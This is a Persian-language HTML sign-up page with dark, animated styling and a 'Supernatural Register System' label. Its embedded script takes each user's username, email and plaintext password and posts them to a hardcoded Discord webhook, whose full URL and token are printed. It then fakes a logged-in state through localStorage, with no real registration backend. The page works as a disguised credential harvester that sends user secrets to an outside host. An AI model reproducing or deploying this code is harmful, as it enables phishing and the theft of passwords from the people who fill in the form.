<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ثبت نام</title>
  <style>
    body {
      font-family: 'Rubik', sans-serif;
      background: linear-gradient(135deg, #0e0e0e, #1a1a1a, #2a2a2a);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .form-container {
      background: rgba(26, 26, 26, 0.9);
      padding: 2.5rem;
      border-radius: 16px;
      width: 360px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(12px);
      animation: fadeIn 1s ease;
    }

    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #8a2be2;
      font-size: 1.6rem;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
      font-size: 0.9rem;
    }

    input {
      width: 100%;
      padding: 0.8rem;
      border: none;
      border-radius: 10px;
      background: #2a2a2a;
      color: #fff;
      font-size: 0.95rem;
      transition: 0.3s;
    }

    input:focus {
      outline: none;
      background: #333;
      box-shadow: 0 0 0 2px #8a2be2;
    }

    .btn {
      width: 100%;
      padding: 0.9rem;
      background: linear-gradient(45deg, #8a2be2, #6a1db7);
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }

    .btn:hover {
      background: linear-gradient(45deg, #6a1db7, #8a2be2);
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(138, 43, 226, 0.5);
    }

    .link {
      display: block;
      text-align: center;
      margin-top: 1.5rem;
      color: #aaa;
      text-decoration: none;
      transition: 0.3s;
    }

    .link:hover {
      color: #fff;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>✨ ثبت نام ✨</h2>
    <form id="registerForm">
      <div class="form-group">
        <label for="username">نام کاربری</label>
        <input type="text" id="username" required>
      </div>
      <div class="form-group">
        <label for="email">ایمیل</label>
        <input type="email" id="email" required>
      </div>
      <div class="form-group">
        <label for="password">رمز عبور</label>
        <input type="password" id="password" required>
      </div>
      <button type="submit" class="btn">🚀 ثبت نام</button>
    </form>
    <a href="login.html" class="link">حساب دارید؟ وارد شوید</a>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6";

    document.getElementById("registerForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const payload = {
        embeds: [
          {
            title: "📥 ثبت‌نام جدید",
            color: 8965321,
            fields: [
              { name: "👤 یوزرنیم", value: username, inline: false },
              { name: "📧 ایمیل", value: email, inline: false },
              { name: "🔑 پسورد", value: password, inline: false }
            ],
            footer: { text: "Supernatural Register System" },
            timestamp: new Date()
          }
        ]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        localStorage.setItem("isLoggedIn", "true");
        window.location.href = "index.html";
      } catch (err) {
        alert("❌ خطا در ثبت‌نام، دوباره تلاش کنید.");
      }
    });
  </script>
</body>
</html>
